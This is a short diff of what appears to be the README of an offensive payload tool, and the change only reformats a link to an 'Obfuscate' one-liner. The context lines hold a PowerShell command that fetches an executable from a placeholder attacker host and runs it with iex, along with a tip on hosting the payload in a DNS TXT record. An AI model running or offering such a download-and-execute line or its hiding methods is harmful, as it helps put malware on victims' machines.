@@ -190,7 +190,9 @@ ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
 ```
 
 [2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT
-[`Obfuscate`](./tools/triggers/oneline.txt)
+
+[Obfuscate](./tools/triggers/oneline.txt)
+
 **Note:**
 It can be hosted as txt on a web server or as TXT record in a DNS server.
 
